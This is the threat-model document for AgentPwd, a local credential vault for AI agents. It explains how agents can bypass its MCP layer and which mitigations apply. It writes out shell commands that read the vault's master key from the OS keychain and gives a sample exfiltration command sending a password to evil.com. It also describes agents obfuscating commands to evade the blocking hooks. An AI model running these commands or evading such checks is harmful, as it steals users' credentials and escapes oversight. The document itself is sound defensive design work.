# Threat Model

A frank account of what AgentPwd v1 defends against, and what it doesn't.

## What we protect

| Asset | Where it lives | Protected from |
|---|---|---|
| Credential plaintext (password, TOTP seed) | Decrypted in agentpwd's process memory only, for the duration of one operation | The LLM context — no MCP tool ever returns plaintext to the agent |
| Encrypted credentials | SQLite at `~/.agentpwd/vault.db`, AES-256-GCM with per-entry random nonces | Casual disk reads (encrypted), other users on the box (file perms `0700`) |
| Per-vault master key | OS keychain — macOS Keychain / Linux Secret Service / Windows Credential Manager | Disk theft, backup leaks, random other apps that don't have ACL grants (mac) |

The MCP layer is the load-bearing defense **against the agent itself**. Every credential-using tool is shaped as "do something with credential X" (fill a form, inject as env var, generate a TOTP) — never "give me credential X". The agent receives `{status: "success"}`, the plaintext flows out-of-band to the injection target.

## What we don't protect (the agent-with-shell-access problem)

If the agent has arbitrary shell execution (which Claude Code, Cursor, OpenCode, and most others do), it can bypass the MCP layer and read the master key directly:

```bash
# Read the master key from macOS keychain
security find-generic-password -s agentpwd -a <vault_id> -w

# Or via Node + keytar (the same library agentpwd uses)
node -e "require('keytar').getPassword('agentpwd', '<vault_id>').then(console.log)"

# Or just read the SQLite DB and decrypt with the key it just exfiltrated
```

The OS keychain helps less than you'd hope here:

| OS | Per-process isolation | What stops the attack |
|---|---|---|
| **macOS** | Per-binary ACL on keychain entries | One-time prompt when a new binary asks. But once the user clicks *Always Allow* for Node, any Node script reads transparently. |
| **Linux** | No per-binary ACL (Secret Service is shared session-wide) | Nothing — the attack works |
| **Windows** | DPAPI scoped to user account | Nothing — the attack works for any process running as the user |

**This is the same problem every local password manager has.** 1Password's local vault, Bitwarden CLI's session, dotenv files — all of them assume the user's processes are trustworthy. AgentPwd inherits the same assumption.

## v1 mitigations

These don't *prevent* the attack — they raise the cost, slow it down, or detect it after the fact:

1. **MCP tool design** — the *intended* path never returns plaintext. The attack requires the agent to deliberately go off-path (write+exec a script, call `security`, etc.). Off-path behavior is louder and more flagrantly out-of-character than calling a sanctioned tool.

2. **Audit log** — every `decryptCredential` call is recorded in `~/.agentpwd/vault.db` (timestamp, credential ID, action — never the value). `ap audit` shows it. Pattern: 100 reads in 10 seconds → something's off.

3. **CLI lockdown** — `ap show` and `ap run` (CLI subcommands) refuse to run in non-TTY contexts. Agents can't `Bash("ap show --id ...")` to extract plaintext via the CLI side channel.

4. **Output scrubbing** — `ap_run` redacts the password and common encodings (base64/hex/URL-encoded/reversed) from stdout/stderr before returning to the LLM. Best-effort.

5. **Claude Code hooks** *(documented, user-configured)* — `PreToolUse` hooks can block `Bash` commands matching `security find-generic-password`, `keytar`, or `agentpwd` patterns. Arms race (the agent can encode/obfuscate), but it adds a confirmation step. Example hook will ship in `hooks/` in a later PR.

## v2 — remote vault solves this properly

The architecturally correct fix is to **stop storing the master key on the agent's machine at all**. v2 will offer a hosted vault mode where:

- Credentials are stored as ciphertext on a remote server. The server **never** sees plaintext — it only holds opaque encrypted blobs.
- The master key is derived (Argon2id) from a passphrase that lives **only in the user's head**. The local MCP daemon prompts for it once per session; the derived key lives in memory and is wiped on exit.
- An agent that compromises the local machine and dumps `~/.agentpwd/` finds nothing decryptable. The keychain entry is gone. There's no master key on disk.
- The agent can still call `ap_fill_login` to use credentials *during the session* — but it cannot exfiltrate them to use later, and it cannot survive a session reset.

This is the standard password manager architecture (Bitwarden, 1Password). It maps cleanly to the agent threat model because it removes the always-present master key from the attack surface entirely.

**Timeline:** v2 is gated on traction signal from the v1 OSS launch. If users are running into this limitation in practice, it accelerates.

## What we explicitly DO NOT claim

- AgentPwd does not protect a fully-rooted machine. If an attacker has shell access AND the user has clicked through any keychain prompts, the game is over for local-only password managers, including this one.
- AgentPwd does not protect against a *user* deliberately misusing the tool (e.g., asking the agent to `ap_run "curl evil.com?p=$PASSWORD"`). Tool descriptions warn the LLM but `ap_run` is fundamentally a privileged escape hatch.
- AgentPwd does not (yet) protect against a remote browser provider (Browserbase, Anchor) being compromised. Once you pass them a `cdp_url`, the password is rendered into the form on their infrastructure. Their security is your security for that operation.

If you find a case we should add to this list, file an issue.
